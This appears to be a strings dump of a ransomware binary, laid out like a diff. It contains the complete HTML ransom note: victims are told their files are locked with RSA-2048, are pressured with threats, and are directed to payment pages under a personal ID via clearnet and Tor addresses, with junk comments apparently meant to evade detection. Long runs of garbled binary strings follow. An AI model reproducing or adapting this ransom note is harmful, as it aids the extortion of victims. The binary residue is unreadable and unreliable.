+http://awoeinf832as.wo49i277rnw.com/1FD5D08AF0CF2FA7 
+https://wls3uapur3zjm5gm.onion.to/1FD5D08AF0CF2FA7  
+Your personal page (using TOR): wls3uapur3zjm5gm.onion/1FD5D08AF0CF2FA7 
+Your personal identification number (if you open the site (or TOR 's) directly): 1FD5D08AF0CF2FA7
+<html>   <style>a { color:green; }.tb {  background:white; border-style:solid; border-width:1px; padding:3px; border-color:lime; }
+.ttl { font-size:13px; color:880000; }</style><body style="background:#33CCFF;">  <center>
+<div style="text-align:left; font-family:Arial; font-size:13px; line-height:20px; margin-top:10px; width:800px; background:#F4F4F4; padding:20px; border-style:solid; border-width:5px; border-color:#BABABA;">
+<b><font class="ttl">What happened <!------sfg2gdfstw5ey3345 --> to your files?</b></font><br> <font style="font-size:13px;">All of your files were<!------sfg2gdfstw5ey3345 -->  protected by a strong<!------sfg2gdfstw5ey3345 --> encryption with<!------sfg2gdfstw5ey3345 --> RSA-2048 
+<br> More information about the <!------sfg2gdfstw5ey3345 -->encryption RSA-2048 can be<!------sfg2gdfstw5ey3345 --> found here: <a href="http://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank">http://en.wikipedia.org/wiki/RSA_(cryptosystem)</a><br></font>
+<br><b><font class="ttl">What <!------sfg2gdfstw5ey3345 --> does this mean?</b></font><br><font style="font-size:13px;">
+This<!------sfg2gdfstw5ey3345 -->  means that the <!------sfg2gdfstw5ey3345 --> structure and data within your files have been irrevocably <!------sfg2gdfstw5ey3345 -->changed, you will not be able to work<br> with them, read<!------sfg2gdfstw5ey3345 --> them or see them, it is the same thing <!------sfg2gdfstw5ey3345 -->as losing them forever, 
+but with our help, you can restore them.</font><br><br><b><font class="ttl">How did this happen?</b></font>  <br>    <font style="font-size:13px;">  Especially for you, on our server was generated the secret key pair RSA-2048 - public and private.
+<br>All your  <!------sdkfg3265436456hdfskjghfdg --> files were encrypted with the public key, <!------sdkfghd456334565436fskjghfdg --> which has been <!------sdkfghd45363456fskjghfdg --> 
+transferred to  <!------sdkfghdfskjghfdg -->your computer via  <!------sdkfghd4356345643564356fskjghfdg -->the Internet.<br> <!------sdkfghd34563456fskjghfdg --> Decrypting of  <!------sdkf45363456ghdfskjghfdg -->YOUR FILES is 
+<!------sdkfghdfs4563456kjghfdg -->only possible  <!------sdkfgh45364356dfskjghfdg -->with the help of the  <!------sdkfghd4563456fskjghfdg -->private key and  <!------sdkfghd43563456fskjghfdg -->decrypt program, 
+<!------sdkfghdf43564356tyretyskjghfdg -->which is on our  <!------sdkfgh34565346dfskjghfdg -->SECRET SERVER!!!. 
+</font><br><br><b><font class="ttl">What do I do?</b></font> <br><font style="font-size:13px;">Alas, if you do not take the necessary measures 
+for the specified time then the conditions for obtaining the private key will be changed.<br>
+If you really need your data, then we suggest you do not waste valuable time searching for other solutions because they do not exist.</font><br><br>
+<!------23452345dgtwertwre --><div class="tb" style="color:#880000; font-size:13px; border-width:3px;">For more specific instructions,
+please visit your personal home page, there are a few different addresses pointing to your page below: <hr>
+<!------sadfs32452345gfdsgsdfgdfsafasdfasdfsadf --><b>1.<a href="http://kwe2342fsd.rt546sdf234re.com/1FD5D08AF0CF2FA7"   target="_blank">http://kwe2342fsd.rt546sdf234re.com/1FD5D08AF0CF2FA7</a></b><br>
+<!------ds234523452345fgwert --><b>2.<a href="http://awoeinf832as.wo49i277rnw.com/1FD5D08AF0CF2FA7"   target="_blank">http://awoeinf832as.wo49i277rnw.com/1FD5D08AF0CF2FA7</a></b><br>
+<!------wer234524353245terwtewrt --><b>3.<a href="https://wls3uapur3zjm5gm.onion.to/1FD5D08AF0CF2FA7" target="_blank">https://wls3uapur3zjm5gm.onion.to/1FD5D08AF0CF2FA7</a></b><br>
+<!------sfg2gdfstw5ey3345 --></div><br><div class="tb" style="font-size:13px; border-color:#880000;">If for some reasons the addresses are not available, follow these steps: <hr>1. Download and install tor-browser: <a href="http://www.torproject.org/projects/torbrowser.html.en" target="_blank">http://www.torproject.org/projects/torbrowser.html.en</a><br>2. After a successful installation, run the browser and wait for initialization.<br>3. Type in the address bar: <font style="font-weight:bold; color:#009977;">wls3uapur3zjm5gm.onion/1FD5D08AF0CF2FA7</font><br>4. Follow the instructions on the site.</div><br><br><b>IMPORTANT INFORMATION:</b><br><div class="tb" style="width:790px;">
+Your Personal PAGES: <b><br> <a href="http://kwe2342fsd.rt546sdf234re.com/1FD5D08AF0CF2FA7" target="_blank">http://kwe2342fsd.rt546sdf234re.com/1FD5D08AF0CF2FA7</a> <br> <a href="http://awoeinf832as.wo49i277rnw.com/1FD5D08AF0CF2FA7" target="_blank">http://awoeinf832as.wo49i277rnw.com/1FD5D08AF0CF2FA7</a>  <br> 
+<a href="https://wls3uapur3zjm5gm.onion.to/1FD5D08AF0CF2FA7" target="_blank"> https://wls3uapur3zjm5gm.onion.to/1FD5D08AF0CF2FA7</a> </b> <br> 
+Your Personal PAGE (using TOR): <font style="font-weight:bold; color:#009977;">wls3uapur3zjm5gm.onion/1FD5D08AF0CF2FA7</font><br>
+Your personal code (if you open the site (or TOR 's) directly): <font style="font-weight:bold; color:#770000;">1FD5D08AF0CF2FA7</font><br>
+</div></div></center></body></html>
+c3eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee:
+ccccccccccccccccccccccccccccccccccBI@cEEc,
+Wki11111111||||||11111111111111111HK
+|JL1
+ii|~iiiiiiiiiiiiiiiAAAAAAAAiiiiiiiiiiiiii1|i
+I3')+*+)))*))()*+++,6J!54 CBA
+jYPQTVTSkllZTTXRTUiHceWda/
+_<bm
+}zy|yx~
+{|yvrrwsqpon
+PPPPPPPPPPPPPPPPPKMNNNNNNNNNNOLO
+JHHGGGGGGGGHI
+JEEEEEEEEEEFC
+JEEEEEEEEEEFC
+JEEEEEEEEEEFD
+JEFEEEEEEEEEB
+O%JEEEEEEEEEFFB
+JJIIIIJIIIIJJ
+O(@>=77A779?<8;$O' 
+)O6530./21+*-,4#4PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
+c3eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee:
+ccccccccccccccccccccccccccccccccccBI@cEEc,
+Wki11111111||||||11111111111111111HK
+|JL1
+ii|~iiiiiiiiiiiiiiiAAAAAAAAiiiiiiiiiiiiii1|i
+I3')+*+)))*))()*+++,6J!54 CBA
+jYPQTVTSkllZTTXRTUiHceWda/
+_<bm
+}zy|yx~
+{|yvrrwsqpon
+PPPPPPPPPPPPPPPPPKMNNNNNNNNNNOLO
+JHHGGGGGGGGHI
+JEEEEEEEEEEFC
+JEEEEEEEEEEFC
+JEEEEEEEEEEFD
+JEFEEEEEEEEEB
+O%JEEEEEEEEEFFB
+JJIIIIJIIIIJJ
+O(@>=77A779?<8;$O' 
+)O6530./21+*-,4#4PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
+PA<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADD
+1'1q1
+3"3'3
+5+585y5
+6 7+757}7
+7J8o8z8
+959>9L9l9
+:):B:]:q:|:
+;%;1;:;?;M;\;e;l;v;};
+<,<]<
+=+=X=
+?B?R?k?u?
+0i0{0
+0#141p1
+292Y2e2
+3(373Q3q3
+656G6L6w6
+6+73797
+7A8T8
+:];h;
+;<<c<
+>[>r>w>
+0'0,0
+1#1(131:1H1M1
+6)6I6V6
+72777f7y7
+8!8/848
+071>1
+L2h5l5p5t5x5|5
+>,?B?
+;5;:;M;
+;-<b<x<
+2Y3|3
+7#7.737:7A7R7W7t7
+?(?2?<?C?J?Q?X?_?f?m?t?{?
+5&5D5N5U5r5
+6D6]6
+7=7P7Z7n7
+9%91969;9@9E9J9O9T9Z9n9
+9 :^:
+:=;{;
+<l<q<
+=9>Y>
+?R?j?
+0<0J0`0g0
+1H1a1g1v1{1
+162I2N2|2
+8B9I9
+93?3
+4%4*4
+8#8(8`8s8x8
+1%1*1
+112;2E2J2S2]2b2j2q2
+2:3O3T3
+5c6|6
+8!8t8{8
+9 9_9u9z9
+:.:3:=:L:Q:Y:`:n:s:
+:-;C;H;
+="=E=J=a=t=y=
+=	>4>9>p>v>
+>8?>?
+0	0 1%1*1h1
+2"2,21282?2M2R2[2p2
+3%3*313:3L3Q3Z3s3
+6-737
+<8<N<T<g<
+=<=B=U=
+>,>1>
+?8?O?T?
+2"2*212:2K2
+3%3E3T3
+3#525]5y5
+6$60676E6^6o6u6
+7$7:7k7q7
+8+<A<G<L<Q<V<[<`<f<l<t<z<
+= =1=l=
+?7?G?M?]?c?s?{?
+A0[0e0z0
+1*181K1X1^1d1
+2)3W3j3
+414:4?4a4j4o4
+575D5M5R5a5
+7#7/7;7G7S7_7k7w7
+:%:8:=:F:K:Z:w:
+;&;/;7;@;E;
+3<4B4g4
+5H5j5t5
+6@6G6w6|6
+7$737B7Q7`7m7u7
+8!8=8C8\8b8{8
+8$9C9Z9f9k9u9
+9H:d;j;p;w;
+<-<4<9<C<M<W<d<j<{<
+=+=1=;=K=Y=m=r=w=|=
+>D>T>_>w>|>
+?/?E?i?p?|?
+0<0F0
+1.1?1H1R1\1r1
+2#2*242B2T2r2
+3M3S3Y3e3
+5?5z5
+6!6(6L6X6x6
+707|7
+9D9`9}9
+:#:E:
+;(;=;P;W;
+;'<;<B<
+>#>*>N>
+?=?[?
+0I0O0`0f0
+0,1U1[1
+2W2k2
+<E<Q<d<i<
+>#>3>=>G>Q>u>
+?B?L?V?`?j?t?~?
+0#0-070A0K0b0l0v0
+1/191C1M1W1g1q1{1
+2$242>2H2R2v2
+3C3M3W3a3k3u3
+4$4.484B4L4c4m4w4
+505:5D5N5X5h5r5|5
+6%656?6I6S6w6
+7 7D7N7X7b7l7v7
+8/8?8L8\8l8
+:(:X:e:x:
+;';:;J;|;
+<><K<^<n<
+=,=<=x=
+>^>k>~>
+>1?;?E?O?Y?c?m?
+0'010;0S0]0g0q0{0
+0	1!1+151?1I1Y1c1m1w1
+2'212;2E2i2s2}2
+373A3K3U3_3i3s3
+4#4-474A4Y4c4m4w4
+5'515;5E5O5_5i5s5}5
+6-676A6K6o6y6
+7=7G7Q7[7e7o7y7
+8)838=8G8_8i8s8}8
+9-979A9K9U9e9o9y9
+:+:;:I:V:l:|:
+;$;+;6;=;H;O;`;g;u;|;
+<)<0<;<B<S<Z<h<o<z<
+=#=.=5=F=M=[=b=m=t=
+>!>(>9>@>N>U>`>g>r>y>
+?<?C?Q?X?c?j?u?|?
+%000L0r0}0
+272=2O2
+3j4x5
+6+6S7[7p7{7
+><?B?\?k?x?
+0&0L0
+0r1y1
+2[3a3j3q3
+4#4.434E4O4T4p4z4
+4(525X5_5y5
+6'7L7[7c7p7|7
+7	8Z8
+9$9*90969=9D9K9R9Y9`9g9o9w9
+;A;M;X<_<
+0$3h4
+:"<)<1<
+=[=h=n=
+=(>?>
+0(020f0q0{0
+1A1T1
+2-393L3^3y3
+4(4Q4b4v4
+707A7z7
+8,868<8F8h8}8
+959M9s9
+:R:Z:
+;";';-;1;7;<;B;G;V;l;r;z;
+=J>Y>t>
+9C:a:
+;);A>8?
+181Y1<3
+5A6Y6c6~6
+6!7>7
+;/;@;M;T;d;v;{;
+=$=<=W=
+>!?G?M?w?
+0)0T0l0
+1A1G1q1z1
+2 292Z2c2
+3%4l4s4}4
+5 535W5
+6N6`6
+7\7f7~7
+9$9)979<9A9F9V9
+:%:*:1:6:D:
+:<;K;U;Z;{;
+;X<]<o<
+<O=U=
+>.?=?
+.1:1@1E1K1
+2-2P2]2i2q2y2
+313O3
+4H5h5X6
+6H8"9
+9#:9:z:
+:6;h;
+<3=T=v=
+1!1j1
+2M3p3	4
+8*8<8b8t8
+9(9:9
+9,:D:K:S:X:\:`:
+::;@;D;H;L;
+<7<i<p<t<x<|<
+?*?}?
+0#0(010;0F0
+4W4w4L7n7
+848W8
+;q;};
+<:<d<
+< =3=D=i=
+=B>j>
+?2?@?I?
+	010c0k0
+0#101O1
+2 21383
+3^5e5
+5C6p6
+8U9_9
+=l>r>w>}>
+>F?L?R?X?
+e0}0
+2	3B3U3#4D586
+1+2_2z2
+2034383<3@3D3H3L3P3T3X3\3`3d3h3
+t1|1
+: :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\:`:d:h:l:p:t:x:|:
+8 9$9(94:<:H:L:P:T:X:\:`:d:h:l:p:t:x:|:
+; ;$;(;8;<;@;D;H;L;P;T;d;h;
+< <$<(<
+505D5X5
+90;4;8;<;
+<0<@<D<T<X<\<`<h<
+=,=<=@=P=T=X=`=x=
+> >$>,>D>
+? ?@?`?
+0 0@0`0
+181X1t1x1
+282X2x2
+3 343<3@3H3P3
+4<4D4L4T4\4d4l4t4|4
+5,5@5T5`5h5
+686@6D6\6`6|6
+0 0@0`0x0
+: :$:(:,:0:4:8:<:@:D:H:L:P:`:d:h:l:p:t:x:|:
+;h;x;
+<p=t=x=|=
+>@?`?|?
+0 0$0(0,0004080<0@0D0H0L0P0T0X0\0`0d0h0l0p0t0x0|0
+1 1$1(1,1014181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1|1
+2 2$2(2,2024282<2@2D2H2L2P2T2X2\2`2d2h2l2p2t2x2|2
+5 5$5
